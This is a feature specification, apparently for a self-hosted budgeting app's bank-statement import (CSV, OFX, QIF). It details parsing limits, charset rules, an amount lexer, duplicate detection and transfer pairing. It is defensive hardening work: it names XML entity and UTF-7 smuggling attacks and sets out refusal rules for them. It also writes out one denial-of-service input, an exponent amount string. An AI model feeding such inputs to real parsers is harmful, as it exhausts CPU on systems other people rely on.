# Feature: File import (CSV / OFX / QIF)

- **Slice:** 12
- **Status:** Planned — ready to build. Nothing is built yet: no endpoint, no migration, no screen,
  no user guide. The open questions were answered on 2026-11-25; see [Decisions](#decisions). **Two
  ADRs must be written at the start of implementation**, before any code (decision 10).
- **Owner:** Repository owner
- **Last updated:** 2026-11-25
- **Depends on:** accounts (3), categories (4), transactions (5), and transfers (8) for the pairing
  action (rule 12). It touches bills (7), envelopes (6) and debts (10) only to say what it does
  **not** do to them.
- **Depended on by:** bank connections (16), which reuses the duplicate rules and the
  never-auto-attach rules. Reporting (13), which relies on the transfer-pairing action (rule 12)
  to keep imported transfers out of income and spending.
- **Related:** [ADR-0006](../adr/0006-money-representation.md) (money),
  [ADR-0008](../adr/0008-user-scoped-data-access.md) as amended by
  [ADR-0017](../adr/0017-households-own-financial-data.md) and
  [ADR-0026](../adr/0026-one-household-per-instance.md) (scoping),
  [ADR-0016](../adr/0016-self-hosted-open-source-product.md) (nothing leaves the box),
  [ADR-0020](../adr/0020-bank-connections-use-user-credentials.md) (file import is the baseline),
  [ADR-0022](../adr/0022-multi-currency-display.md) (currency),
  [ADR-0023](../adr/0023-internationalisation.md) (codes over prose),
  [ADR-0025](../adr/0025-bills-are-occurrences-not-generated-transactions.md),
  [ADR-0028](../adr/0028-account-last-four-digits.md) (account identifiers),
  [ADR-0030](../adr/0030-the-runtime-cannot-change-the-schema.md) (runtime role),
  [ADR-0033](../adr/0033-a-transfer-is-a-linked-pair-and-may-cross-currencies.md),
  [ADR-0035](../adr/0035-a-debt-payment-is-a-plan-record-not-a-transaction.md),
  [transactions.md](transactions.md), [accounts.md](accounts.md), [transfers.md](transfers.md)

## Purpose

Typing every purchase by hand is the main reason people give up on a budget. Every bank in every
country will hand over a statement file: a CSV from the website, an OFX or QFX for accounting
software, or a QIF from an older export. Import turns that file into transactions in one of your
accounts. It needs no credentials, no third party and no regulatory status, which is why it ships
before bank connections and why connections are an addition on top of it, not a replacement
([roadmap](../roadmap.md#why-this-order), ADR-0020).

The person importing must be able to trust three things. **Nothing is written until they have
seen exactly what will be written.** Importing the same file twice changes nothing. And a file
from a bank, or from someone pretending to be one, cannot do anything to the instance except
offer rows for them to accept or refuse.

**This is the highest-risk slice on the roadmap**, because the server parses a file it did not
write. The threat model is the [Security considerations](#security-considerations) section, and
it is the reason most of the rules below exist.

## User stories

- As a **member or owner**, I want to drop in last month's statement and see what would be added
  before anything is, so I can stop if the file is for the wrong account or the signs look backwards.
- As a **member**, I want re-importing an overlapping statement to add only the rows that are new,
  so I can export "the last 90 days" every month without thinking about overlaps.
- As a **member**, I want two genuinely identical purchases on the same day (two coffees, same
  price, same shop) to both arrive, and to arrive only once each.
- As a **member** whose bank only offers CSV, I want to tell the app once which column is which and
  have it remember that for this account.
- As a **member** who typed some purchases by hand during the month, I want the import to point out
  rows that look like ones I already entered, instead of silently doubling them.
- As a **member** who moved money to savings, I want to say that the withdrawal from one statement
  and the deposit from the other are one transfer, so reports do not count it as spending and
  income.
- As a **viewer**, I want to see imported transactions like any others. I do not expect to import.

## Prerequisites

At least one unarchived account (slice 3). Transactions (slice 5) supplies the table, the
`external_id` column, the partial unique index `ux_transactions_household_external_id` on
`(household_id, external_id)`, and `Transaction.importedAs(...)`. All of these exist today and were
put there for this slice (`V12__payees_and_transactions.sql`).

## Rules and behavior

### 1. Preview, then commit. Nothing is written by the preview

The flow has two requests. **Decided (decision 10), and recorded as an ADR at the start of
implementation:**

1. **Preview.** The client sends the file, the target account and (for CSV) the column mapping.
   The server parses it, classifies every row, and returns a summary, the rows that need a
   decision, a sample, and a **`previewDigest`**. **It writes nothing**: no transaction, no payee,
   no staging row, no temp file. The precedent is the debt payment preview
   ([debt-plan.md](debt-plan.md), `POST /api/debts/{id}/payments/preview`).
2. **Commit.** The client sends the **same file and options again**, plus the user's decisions and
   the `previewDigest`. The server parses the file again through **the same code path** and
   recomputes the digest. If the digest matches, it writes every accepted row **in one database
   transaction**. If it does not match, it writes nothing and answers `409 import-preview-stale`.

Why a re-upload instead of keeping state on the server:

- **Nothing parsed from the file exists on the server between the two requests.** A staging table
  would persist financial data from files the user then abandons, which needs an expiry job, would
  appear in every backup in the meantime, and would have to be included in household deletion
  (domain invariant 6). An in-memory draft is lost on restart and is unbounded memory that one
  user controls.
- **The client never supplies parsed rows.** If commit took rows from the client, the server would
  be writing whatever the client said and the preview would be decoration. Because commit
  re-parses, what is written is always what the server read from the file.
- **The cost** is uploading the file twice. At the 5 MiB cap (decision 1) that is acceptable on a
  phone.

**What the digest is.** It is SHA-256 over a canonical serialisation of the target account id,
the account's currency, and for every row in file order: its record number, classification,
date, amount, payee text, note text and `external_id`. It deliberately excludes the account's
current balance, so a member typing an unrelated transaction between preview and commit does not
make the preview stale. **It is an integrity check for an honest user's screen, not a security
boundary.** A client that forges it gains nothing, because the server only ever writes rows it
parsed itself into an account the caller may already write to. Treat it as such and do not give
it an HMAC: there is no attacker it would stop.

**Commit is idempotent on the digest.** `import_batches.preview_digest` is unique per household.
If a commit times out and is retried after the first attempt succeeded, the server finds the
existing batch and returns it with `200` instead of creating anything. That meets the
`Idempotency-Key` intent in [api-style.md](../guides/api-style.md#idempotency) without a header,
and the header does not exist anywhere in the codebase today (see Implementation notes).

**Commit is all or nothing.** Any failure (a unique-index collision from a concurrent import, an
account archived since the preview, a constraint violation) rolls back every row and the batch
record. There is no partially imported file.

### 2. Formats accepted in v1

| Format | Recognised by | Notes |
|---|---|---|
| **OFX 1.x** (SGML), including **QFX** | Header block starting `OFXHEADER:100` | QFX is OFX with Intuit extensions. Treated as OFX, and unknown `INTU.*` elements are ignored |
| **OFX 2.x** (XML), including QFX | `<?xml ...?>` followed by `<?OFX OFXHEADER="200" ...?>` | |
| **QIF** | First non-blank line `!Type:Bank`, `!Type:CCard`, `!Type:Cash`, `!Type:Oth A` or `!Type:Oth L` | |
| **CSV** | Declared by the client and not matched by the sniffing above | Delimiter `,` `;` `\t` or `\|` |

- The request **declares** the format and the server **verifies** it by sniffing. A mismatch is
  `400 import-format-mismatch`. The server never decides "this is probably CSV" on its own, and
  never tries several parsers in turn on the same bytes.
- **One statement for one account per file.** An OFX with more than one `STMTRS` or
  `CCSTMTRS`, or a QIF with an `!Account` list naming more than one account, is
  `422 import-multiple-accounts`. The canvas's own fictional changelog lists *"multi-account OFX"*
  and CAMT.053 as later additions, which matches this.
- **Refused outright:** OFX `SECURITY` other than `NONE` (encrypted), OFX `COMPRESSION` other than
  `NONE`, QIF `!Type:Invst`, any archive (`.zip`, `.gz`), and any request with a
  `Content-Encoding` other than `identity` (`415`). Investment QIF carries buys, sells and share
  quantities that this ledger cannot represent, and importing only its cash column would be a
  silently wrong ledger.
- **One file per preview** (decision 9), although the canvas's "Choose files" is plural.

### 3. Limits are enforced before parsing

The limits below are decided (decision 1). They are fixed configuration under
`budgetowl.import.*`, not per-request values. The order is the point: **bytes are counted before
anything decodes them, and lines are counted before anything parses them.**

| Limit | Value | Enforced where | When exceeded |
|---|---|---|---|
| File size | **5 MiB** decoded | (a) nginx `client_max_body_size` on `location /api/imports` only, sized for base64 (7m); (b) a request filter that refuses a declared `Content-Length` over the cap and counts streamed bytes, so a chunked body is caught too; (c) checked again after base64 decode | `413 import-file-too-large` |
| Empty file | 0 bytes, or only whitespace | after decode | `400 import-file-empty` |
| Physical lines | CSV 12,000; QIF 200,000 | a pre-scan over the decoded bytes, **before** any CSV or QIF parser runs. QIF needs the higher figure because one record is several lines (`D`, `T`, `P`, `M`, `C`, `^`, plus address and split lines) | `422 import-too-many-rows` |
| Physical line length (CSV, QIF) | 4 KiB | same pre-scan | `400 import-file-malformed`, reason `line-too-long` |
| Transactions per file | **10,000** | the parser, counting records | `422 import-too-many-rows`. **The whole file is refused, never truncated.** Truncating silently drops a household's money |
| CSV columns | 64 | CSV reader | `400 import-file-malformed`, `too-many-columns` |
| CSV preamble lines before the header | 20 | mapping validation | `400 validation-failed`, field `options.headerRow` |
| OFX element nesting | 32 | tokenizer / StAX loop | `400 import-file-malformed`, `too-deep` |
| OFX elements | 200,000 | tokenizer / StAX loop | `400 import-file-malformed`, `too-many-elements` |
| OFX tag name / leaf text | 64 chars / 1 KiB | tokenizer / StAX loop | `400 import-file-malformed`, `element-too-long` |
| Text handed to the date or amount lexer | 64 chars | before lexing | row error |
| Parse deadline | 15 s wall clock, checked every 256 records | parser loop | `422 import-file-too-complex` |
| Concurrent parses | 1 per user, 2 per instance | a semaphore around preview and commit | `429 rate-limited` with `Retry-After` |
| Previews plus commits | 30 per user per 10 minutes | an `ImportRateLimiter` in the shape of `TermsSolveRateLimiter`: in memory, per instance, keyed by user id | `429 rate-limited` |

Why each one exists:

- **The size cap has to be in three places**, and the current deployment fails without that.
  `frontend/nginx.conf` sets no `client_max_body_size`, so nginx's default of 1 MiB applies to
  every `/api` request today. An import of a 1.2 MiB statement would get an nginx `413` page, not a
  problem response, and `ng serve`'s proxy would not reproduce it. Self-hosters who put their own
  reverse proxy in front also have their own limit, so the user guide must explain a `413` there.
- **Line limits apply to CSV and QIF only.** Some banks write OFX 2.x as a single line with no
  newlines, so a line-length cap would refuse legitimate files. For OFX the equivalents are the
  element, depth and leaf-length caps.
- **The row cap bounds everything downstream:** payees created per import, rows inserted in one
  transaction, the size of the preview response, and the length of the decision list a commit may
  carry.
- **Two parses per instance** because the instance may be a small single-board computer.
  `backend/Dockerfile` gives the JVM 75% of RAM with the serial collector.

### 4. Character sets

Bank files arrive in whatever encoding the bank's software used. The rule is **an allowlist and no
silent guessing**:

1. A **BOM** decides it: UTF-8, UTF-16LE or UTF-16BE. Spreadsheet exports of "Unicode text" are
   commonly UTF-16LE with a BOM.
2. Otherwise a **declaration** decides it: the OFX 1.x `ENCODING` and `CHARSET` header lines, or the
   OFX 2.x XML declaration. The declared value must be in the allowlist, or the file is
   `422 import-encoding-unsupported`.
3. Otherwise **strict UTF-8** is tried (`CodingErrorAction.REPORT`, not `REPLACE`). If every byte
   decodes, it is UTF-8.
4. Otherwise the server **does not guess**. The preview comes back with `charset: null`, the
   allowlist, and a few decoded sample cells per candidate, and the user picks. Windows-1252 is
   pre-selected because it is the most common fallback in bank exports, but it is not applied
   without that choice.

The **allowlist** is UTF-8, UTF-16LE, UTF-16BE, windows-1250, windows-1251, windows-1252,
ISO-8859-1, ISO-8859-2 and ISO-8859-15. It is extended by adding a name to it, with a test. It is
**never** `Charset.forName(whateverTheFileSaid)`. **UTF-7 is never accepted**, whatever the file
declares: it encodes `<` and `>` as innocent-looking ASCII and is the classic way to slip markup
past a filter. EBCDIC code pages and UTF-32 are not accepted either. A single-byte charset maps an
undefined byte (0x81 in windows-1252, for example) to a decode **error**, never to U+FFFD.

After decoding, every text value that will be stored goes through the same normaliser, in this
order:

- **A NUL byte anywhere in the file refuses the file** (`400 import-file-malformed`, `binary`).
  It means binary content, or UTF-16 decoded as something else.
- Unicode **NFC** normalisation, so "é" typed two ways is one payee.
- Removal of C0 and C1 control characters (CSV keeps tab as a delimiter only), of zero-width
  characters (U+200B to U+200D, U+FEFF inside text), and of **bidi embedding, override and isolate
  controls** (U+202A to U+202E, U+2066 to U+2069). LRM and RLM (U+200E, U+200F) are kept, because
  legitimate right-to-left payee names use them (ADR-0023).
- Whitespace collapsed to single spaces, then trimmed.

### 5. Reading each format

#### OFX 1.x (SGML): a purpose-built tokenizer, not an SGML or XML parser

- The header block (`OFXHEADER`, `DATA:OFXSGML`, `VERSION`, `SECURITY`, `ENCODING`, `CHARSET`,
  `COMPRESSION`, `OLDFILEUID`, `NEWFILEUID`) is read line by line, with each key at most once.
  An unknown key or a missing required key is `400 import-file-malformed`, `header`.
- The body is read by a **small tokenizer written for OFX**: `<NAME>` opens an aggregate or a
  leaf, `</NAME>` closes one, and leaf text runs to the next `<`. It knows the aggregates this
  feature reads (`OFX`, `BANKMSGSRSV1`, `CREDITCARDMSGSRSV1`, `STMTTRNRS`, `STMTRS`, `CCSTMTRS`,
  `BANKTRANLIST`, `STMTTRN`, `LEDGERBAL`, `BANKACCTFROM`, `CCACCTFROM`) and skips everything else
  without interpreting it.
- **It has no DTD, no entity declarations and no marked sections.** `<!` anywhere in the body
  (`<!DOCTYPE`, `<!ENTITY`, `<![CDATA[`) refuses the file: `400 import-file-malformed`, `dtd`.
- In leaf text, only `&amp;` `&lt;` `&gt;` `&quot;` `&apos;` and numeric character references to
  allowed code points are decoded. Any other `&name;` is a row error, never looked up.
- **Rejected alternative:** rewriting SGML into XML (closing the unclosed leaves) and handing the
  result to an XML parser. It is the common shortcut. It inherits every XML parser risk below, and
  the auto-closing heuristics are fragile against exactly the malformed input an attacker sends.

#### OFX 2.x (XML): StAX with DTDs refused

- Parsed with the JDK's StAX `XMLInputFactory`, configured **per factory instance** (never through
  system properties, which would affect the whole JVM):
  - `XMLInputFactory.SUPPORT_DTD = false`
  - `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false`
  - `XMLConstants.ACCESS_EXTERNAL_DTD = ""` and `XMLConstants.ACCESS_EXTERNAL_SCHEMA = ""`
  - `XMLInputFactory.IS_COALESCING = false`, so leaf-length limits apply per text event
- **A `DTD` event refuses the file** (`400 import-file-malformed`, `dtd`), even when the parser
  would otherwise ignore it. Flags alone have been bypassed before, and a statement has no
  legitimate reason to carry a DOCTYPE. Billion-laughs, quadratic-blowup and external-entity
  payloads all need a DTD, so all of them stop here.
- **An entity reference is an error**, because nothing is declared. Only the five predefined
  entities and character references are expanded.
- Processing instructions other than the leading `<?OFX ...?>` are ignored. XInclude does not
  apply to StAX. **Not** DOM, **not** JAXB unmarshalling straight from bytes, and **not** any XML
  library added to the build for this feature without its own review.
- The `<?OFX ...?>` header must say `SECURITY="NONE"`. Its other fields are checked for shape.

#### What is read from OFX, and what never leaves the parser

| Element | Used for |
|---|---|
| `STMTTRN/DTPOSTED` | the transaction date (see Dates) |
| `STMTTRN/TRNAMT` | the amount (see Amounts) |
| `STMTTRN/FITID` | duplicate detection (see Duplicates). Hashed before storage |
| `STMTTRN/NAME` or `PAYEE/NAME` | payee |
| `STMTTRN/MEMO` | note, when it differs from the payee |
| `STMTRS/CURDEF` | must equal the account's currency, else `422 import-currency-mismatch` |
| `LEDGERBAL/BALAMT`, `DTASOF` | shown in the preview as "your bank says", **never stored** |
| `BANKACCTFROM/ACCTID`, `CCACCTFROM/ACCTID` | compared in memory with the target account's `lastFour` to produce `accountHint`, then **discarded**. Never stored, logged or returned |

These **are never stored, logged or returned**: `ACCTID` (a full account number), `BANKID` or
`BRANCHID` (sort code or routing number), `SIGNONMSGSRSV1` (which may include the institution's
name and the session), `INTU.USERID` (which some QFX files carry and which can be the user's
online-banking username), `AVAILBAL`, `TRNTYPE`, `SIC`, `CHECKNUM`, `REFNUM`, `ORIGCURRENCY` and
`CURRENCY`. ADR-0028 decided the most the app stores about an account number is four digits, and a
statement file must not widen that.

#### QIF

- Records end with `^`. Fields: `D` date, `T` or `U` amount (if both are present they must agree,
  else row error), `P` payee, `M` memo (becomes the note), `C` cleared flag, `N` check number
  (ignored), `L` category (ignored, see Out of scope), `A` address lines (**dropped**: a payee's
  postal address is personal data the ledger has no use for), and the split lines `S`, `E` and `$`
  (ignored: the record imports as **one** row for its `T` total, because splitting is out of scope
  in [transactions.md](transactions.md)).
- A record with no `D` or no `T` or `U` is a row error. A complete final record with no closing `^`
  is accepted. Unknown field letters are ignored.
- `!Option:` lines are ignored. `!Type:Cat`, `!Type:Class` and `!Type:Memorized` list sections are
  skipped. Exactly one transaction section is accepted.

#### CSV: RFC 4180, with the mapping supplied by the user

- Quoting per RFC 4180: a quoted field may contain the delimiter, `""` and line breaks. **An
  unclosed quote is bounded by the line-length pre-scan and the record-length check**, so it
  cannot swallow the rest of the file into one field.
- The **mapping** is part of the request, validated as a DTO with Bean Validation, and
  re-validated against the file:
  - `delimiter`: one of `,` `;` `\t` `|`
  - `headerRow`: 0 to 20 (0 means no header)
  - `charset`: from the allowlist
  - `columns`: a role for some column indexes. Roles: `DATE` (required, exactly one); either
    `AMOUNT` (one signed column) **or** `DEBIT` plus `CREDIT` (two unsigned columns, exactly one
    of them non-empty per row) **or** `AMOUNT` plus `DIRECTION` (with the two values that mean in
    and out, e.g. `CR` and `DR`); then optionally `PAYEE`, `NOTE` (at most two, joined with " · "),
    `REFERENCE` (a bank-supplied transaction id, used for duplicates) and `CURRENCY` (each row must
    equal the account's currency). A column has at most one role. Indexes must be inside the
    file's column count.
  - `dateFormat`: from the allowlist in Dates
  - `decimalSeparator`: `.` or `,`. `groupingSeparator`: none, `,`, `.`, space, NBSP, U+202F or `'`.
    It must differ from the decimal separator
  - `invertSign`: boolean, applied after parsing. For card exports that list charges as positive
- The server **suggests** a delimiter, header row, date format and separators from the first 50
  records, and returns them with the preview. The user confirms them. A suggestion is never
  applied without appearing on screen first.
- A row with fewer columns than the highest mapped index is a row error. Extra columns are
  ignored.
- **A saved mapping** (the canvas's "Saved column mappings") is stored per account, holds only the
  settings above plus the header labels it was made against, and is pre-selected next time. If the
  new file's header labels differ, the preview says the bank may have changed its export format
  and does not apply the mapping silently.

### 6. Dates

- **The stored value is a calendar date** (`transactions.date`), so no time zone is ever applied.
  OFX `DTPOSTED` looks like `20260801120000.000[-5:EST]`. The first eight characters are the
  date, the rest is checked for shape and then ignored. **Converting it to an instant and back
  would move transactions near midnight into the neighbouring day**, and sometimes into the
  neighbouring month. `DTPOSTED` is used rather than `DTUSER` because the specification requires
  it and `DTUSER` is optional. That is an assumption the owner may overrule.
- **CSV and QIF date formats come from an allowlist**, not from a pattern the user types:
  `uuuu-MM-dd`, `dd/MM/uuuu`, `MM/dd/uuuu`, `d/M/uuuu`, `M/d/uuuu`, `dd.MM.uuuu`, `dd-MM-uuuu`,
  `uuuuMMdd`, plus QIF's `M/d/yy`, `M/d'yy` and `d/M/yy`. Month names are not accepted in v1
  (they are language-dependent, ADR-0023).
- **`ResolverStyle.STRICT` with `uuuu`, never `yyyy`.** Verified on the JDK in this repository on
  2026-11-25:
  - the default `SMART` resolver parses `2026-02-30` as **`2026-02-28`**, a silently wrong date;
  - `STRICT` with `yyyy` refuses **every** date, because `yyyy` is year-of-era and needs an era;
  - `STRICT` with `uuuu` parses `2026-08-01` and refuses `2026-02-30`.
- **ASCII digits only.** Text with other digit characters (Arabic-Indic `٢٠٢٦`, full-width
  digits) is a row error. The same rule as `lastFour` in [accounts.md](accounts.md).
- **Ambiguity is the user's to resolve.** If more than one allowlisted format parses every row
  (every day is 12 or less, so `dd/MM` and `MM/dd` both work), the preview returns
  `dateFormat: null` with the candidates, and commit refuses until one is chosen. If only one
  candidate parses every row, it is suggested.
- **Two-digit years** fall in the 100-year window ending at next year, measured from the injected
  `Clock`. The preview shows the resolved four-digit dates.
- **Range:** from 1900-01-01 to today plus 31 days, using the injected `Clock`. Outside that range
  is a row error (`row-date-out-of-range`). The upper margin allows for pending rows a bank dates
  ahead and for time-zone differences between the server and the user.
- Spreadsheet serial dates (`45678`) are a row error. They are not guessed.

### 7. Amounts: text to `BigDecimal` through one strict lexer, never through `double`

ADR-0006. **No amount from a file is ever given to `Double.parseDouble`, `Float`, `NumberFormat`
or `DecimalFormat`, and raw file text is never given to `new BigDecimal(...)` or to
`AmountText.parse`.** Each of those accepts something it must not. Verified on this repository's
JDK on 2026-11-25:

| Input | What it does | Why it matters |
|---|---|---|
| `1E+10000000` (11 characters) | `new BigDecimal` accepts it, `AmountText`'s scale check passes it (scale −10,000,000), and `Money.of`'s `setScale(4)` then builds a 10-million-digit number in **≈ 4.4 s of CPU** | One cell is a denial of service. Ten thousand rows of it is an outage. The JSON API is protected only by each DTO's `@Pattern`, and a file has no `@Pattern` |
| `١٢٣` | `new BigDecimal` returns `123` | Non-ASCII digits parse as numbers |
| `0x1p3`, `Infinity` | `Double.parseDouble` returns `8.0` and `Infinity` | Hex floats and non-finite values |
| `1.234,56` | `NumberFormat.getInstance(GERMANY).parse` returns a **`Double`** | The natural way to "handle locales" goes through binary floating point |
| `12abc` | `NumberFormat.parse` returns `12` | Lenient parsing silently drops garbage |

The lexer, in order:

1. Reject text longer than 64 characters. Trim ASCII whitespace, NBSP and U+202F.
2. Optional currency: a leading or trailing ISO code or symbol is accepted **only if** it is the
   account's own currency. Anything else is `row-currency-mismatch`.
3. Sign, from one of: a leading `-` `+` or U+2212 (minus sign); a trailing `-`; enclosing
   parentheses (accounting negative); or, for CSV with a `DIRECTION` column, the mapped value.
   More than one sign marker is a row error.
4. Remove the configured grouping separator. Then the remainder must match
   **`^[0-9]{1,15}([.,][0-9]{1,4})?$`**, using the configured decimal separator only. No exponent,
   no second decimal separator, ASCII digits only. That regex has no nested quantifiers and runs
   on at most 64 characters, so it cannot backtrack badly.
5. Build the canonical string `-?digits(.digits)?` and only then call `new BigDecimal(canonical)`.
   Fifteen integer digits and four fraction digits fit `NUMERIC(19,4)` exactly.
6. More than four decimal places is a row error (`row-amount-too-precise`), **never rounded**. The
   same rule as [transactions.md](transactions.md) rule 3.
7. Apply `invertSign`.
8. **Zero** is not imported. Banks include zero-amount informational rows; the database refuses
   them (`ck_transactions_amount_nonzero`) and they move no money. They are counted in the preview
   as "not imported: zero amount", so they are not silently missing.

**The sign convention is shown, not assumed.** OFX `TRNAMT` is signed from the account holder's
point of view, negative meaning money out, for bank and card statements alike. Some banks get card
statements backwards, and CSV exports vary. So the preview always shows money-in and money-out
totals separately, and for OFX it shows the bank's `LEDGERBAL` next to what the account's balance
would be after import. A file with inverted signs therefore shows a difference of twice the
statement's movement on the first screen.

### 8. Payee, note, status, category

- **Payee:** the normalised payee text, cut to the first 80 code points at a code-point boundary to
  fit `ck_payees_name_length`. Get-or-create, case-insensitively, through the same household-scoped
  path a typed transaction uses ([transactions.md](transactions.md) rule 5). Blank means no payee,
  which is allowed. "STARBUCKS #1234" becomes its own payee. Merging it with "Starbucks" is the
  payee-normalisation work that [transactions.md](transactions.md) defers to reporting.
- **Note:** OFX `MEMO`, QIF `M`, or the CSV `NOTE` columns, normalised and cut to 500 code points
  (`ck_transactions_note`). It is dropped if it equals the payee text.
- **Truncation is never silent.** The preview shows the stored value, and rows that were cut are
  marked.
- **Status: every imported row is `CLEARED`.** A statement lists what the bank processed. QIF's
  `R` and `X` (reconciled) also become `CLEARED`, because `RECONCILED` belongs to reconciliation and
  no caller may set it ([transactions.md](transactions.md) rule 9).
- **Category: none.** Every imported row arrives in **"Needs a category"**, which is the work queue
  the ledger already shows (transactions rule 4). The canvas's "Auto-categorize on import" is not
  in v1 (decision 8).
- **Archived account:** `409 account-archived` at preview and at commit, the same rule as
  transactions rule 6.
- **The account is chosen by the user, never inferred from the file.** `accountHint` only warns.

### 9. Duplicate detection

The file's own identifier is used where it has one, a fingerprint where it does not, and a looser
"looks like" check flags rows the user decides on.

#### Tier 1: exact duplicates (skipped, not offered)

Every imported row gets an `external_id` of the form **`<scheme>:<64 hex characters>`**, where the
hex is SHA-256 over a length-prefixed canonical tuple. The schemes:

| Scheme | When | Tuple hashed |
|---|---|---|
| `ofx1` | OFX row with a `FITID` that is unique within the file | account id, `FITID` |
| `ref1` | CSV with a mapped `REFERENCE` column, value unique within the file | account id, reference |
| `fp1` | everything else: QIF, CSV without a reference, OFX with a blank or repeated `FITID` | account id, date, amount at scale 4, case-folded normalised payee text, **occurrence ordinal** |

A row whose `external_id` already exists in the household is an **exact duplicate**. It is counted
and listed, it is never written, and it cannot be included by an override.

Three properties make this correct, and each was a real choice:

- **The account id is inside the hash.** `ux_transactions_household_external_id` is unique per
  **household**, but an OFX `FITID` is only unique per account at one bank. Two accounts at two
  banks can both have `FITID` `20260801001`. Storing the raw `FITID` would make the second account's
  real transaction look like a duplicate of the first's and **silently drop it**. Hashing the
  account id in keeps the existing index correct without a migration to it.
- **Hashing gives a fixed length and stops the identifier being stored as written.** A hash is 69
  characters, inside `ck_transactions_external_id`'s 200, and some banks put account numbers inside
  `FITID`s. **It is not a confidentiality control**: the inputs are low-entropy and anyone with the
  database has the transactions anyway. It must not be described as one.
- **The occurrence ordinal is what makes genuinely identical rows work.** The ordinal of a row is
  how many earlier rows **in the same file** have the same (date, amount, payee) tuple, plus one.
  Two £3.50 coffees on 3 August at the same shop get ordinals 1 and 2, so both import. Importing
  the same file again produces ordinals 1 and 2 again, so both are skipped. A later statement that
  overlaps 3 August and contains the same two coffees skips both. One taken mid-afternoon with only
  the first coffee, followed by a full one, imports the second coffee exactly once. Reordering rows
  in the file does not matter, because the ordinal counts identical tuples rather than positions.
  The preview explains identical rows ("2 identical rows on 3 Aug: both will be imported. Banks list
  the same purchase twice when it happened twice"), so nobody excludes one thinking it is a mistake.

The canvas's file-import card says *"duplicates matched on date, amount and payee"*. Tier 1 `fp1`
is exactly that, made safe for identical rows by the ordinal and scoped to one account.

**Where a fingerprint is wrong, and what covers it.** A bank that changes a row's description
between two exports (pending text replaced by posted text) or regenerates `FITID`s produces a new
`external_id` for the same transaction. Tier 2 catches most of these. A bank that reuses a `FITID`
for two different transactions in **different** files makes the second look like an exact duplicate.
That is an accepted risk (see Security considerations), and the row can be typed by hand.

A `FITID` (or `REFERENCE`) that repeats **within one file** for rows whose content differs is
treated as unreliable: every row sharing it falls back to `fp1`, and the preview says the bank
reused an identifier.

#### Tier 2: suspected duplicates (flagged; the user decides)

A new row is a **suspected duplicate** when an existing transaction in the **same account** has an
equal amount (`compareTo`) and a date within ±3 days, whatever its origin. That is chiefly a
transaction the person **typed by hand**, which has no `external_id` and so can never match tier
1. Matching is **one to one**: each existing transaction can be claimed by at most one imported
row, closest date first. Otherwise one typed coffee would suppress two imported ones. Transfer legs
are included as candidates, because a transfer typed through "Move money" often appears again in
the statement.

Suspected rows are listed with the transaction they resemble, and are **excluded by default**
(decision 3), with a visible count and one-click "include all". The user can flip each one, or all
of them, before committing.

#### What re-import does to a row someone edited or deleted

- **Edited** (category, payee, note, even amount): its `external_id` is unchanged
  (`updatable = false`), so it stays an exact duplicate and the edit stands. The user's correction
  always beats the file.
- **Deleted:** its `external_id` went with it, so the next overlapping import offers it again as
  new (decision 6).

### 10. What import never does

- **Never attaches a row to a bill occurrence, an envelope entry or a debt payment.** Those links
  are the household's to make (ADR-0025, ADR-0035, and the envelopes rule that a transaction never
  files itself). ADR-0035 rejected an automatic ledger write for debt payments precisely because
  import was coming. Import arriving must not reintroduce the automatic match from the other side.
- **Never creates a transfer, and never guesses that two rows are one.** A person pairs them with
  the ledger action in rule 12 (decision 7).
- **Never sets a category.** See rule 8 and decision 8.
- **Never contacts anything off the instance** (ADR-0016). No institution lookup, no logo fetch,
  no currency rate, and no URL inside the file is ever dereferenced.

### 11. The raw file is never stored

Decided (decision 10), and recorded as an ADR at the start of implementation.

The file exists in the API process's memory for the length of one request, and then it is gone.
It is not written to the database, to a volume, or to a temp file. Its name and its hash are not
stored either.

Why:

- **It holds more than the ledger does.** A statement carries the full account number, the
  sort code or routing number, sometimes the holder's name and postal address, running and
  available balances, and in some QFX files the online-banking username. The ledger keeps none of
  these, and ADR-0028 limited the stored account identifier to four digits on purpose. Keeping the
  file would undo that decision for every account that is ever imported.
- **Everything stored is in every backup**, and the operator can read all of it (ADR-0026).
- **A second copy of the same transactions eventually disagrees with the ledger**, the moment
  someone edits a row.
- **It adds retention and deletion obligations**: household deletion (domain invariant 6), and an
  answer to "how long do you keep my bank statements?" The only safe answer to that is "we don't".

**The cost, accepted:** a file imported with a parser bug cannot be re-processed after the fix. The
user re-downloads it from their bank, which they can always do.

**What makes "never on disk" true, not merely intended:**

- The file travels as a base64 field inside a JSON body, not as `multipart/form-data` (rejected
  alternative below). Spring Boot's multipart support writes parts to the temp directory by default
  (`spring.servlet.multipart.file-size-threshold` is 0 B), so the multipart path would leave
  statements in the container's `/tmp`. That is exactly the failure that goes unnoticed, because
  nothing reads `/tmp`.
- No heap dump is configured (`backend/Dockerfile` sets no `HeapDumpOnOutOfMemoryError`). An
  operator who adds one accepts that a dump taken during an import contains the file (accepted
  risk).
- The canvas's Admin · Storage page keeps "raw payloads … the provider's response bodies, kept only
  for debugging a bad import". That describes **bank connections** (slice 16), not files. This
  section does not decide slice 16, but slice 16 should have to argue against it.

### 12. Pairing two rows into a transfer

A transfer between your own accounts arrives as two ordinary rows, one in each account's statement,
usually in different files on different days. Import cannot know they are one transfer and does not
guess. So slice 12 ships a **manual ledger action, "these two rows are one transfer"**, that turns
two existing transactions into a linked pair under ADR-0033 (decision 7). Reporting (13) depends on
it: once paired, both rows drop out of income and spending.

It works on any two transactions, imported or typed. **Matching stays manual.** Nothing suggests,
ranks or preselects a partner, at import or afterwards.

**What must be true.** Every rule is checked before anything is written, and a refusal writes
nothing. The rules are the pair invariants from ADR-0033 and [transfers.md](transfers.md). This
action adds none of its own.

| Rule | Refused with |
|---|---|
| The caller is `OWNER` or `MEMBER`. Checked before either row is looked up | `403 read-only-role` |
| Both rows belong to the caller's household, each resolved through the scoped ledger lookup | `404 not-found` |
| Neither row is already a transfer leg | `409 transfer-leg-not-separate` |
| The rows are in different accounts | `422 transfer-pair-mismatch`, reason `same-account` |
| The amounts have opposite signs | `422 transfer-pair-mismatch`, reason `same-sign` |
| Same currency: the amounts are equal and opposite (`compareTo`). Different currencies: opposite signs only, and each row keeps its own figure | `422 transfer-pair-mismatch`, reason `amounts-differ` |
| Both rows are at the version the caller read | `409 stale-version` |
| Neither account is archived. An archived account takes no new transfers ([transfers.md](transfers.md)) | `409 account-archived` |

V15's deferred trigger (two rows, two accounts, opposite signs) stays the backstop if the service is
wrong.

**What changes**, in one database transaction:

- Both rows get one new `transfer_group_id`.
- `category_id` is cleared on both, because `ck_transactions_transfer_has_no_category` requires it.
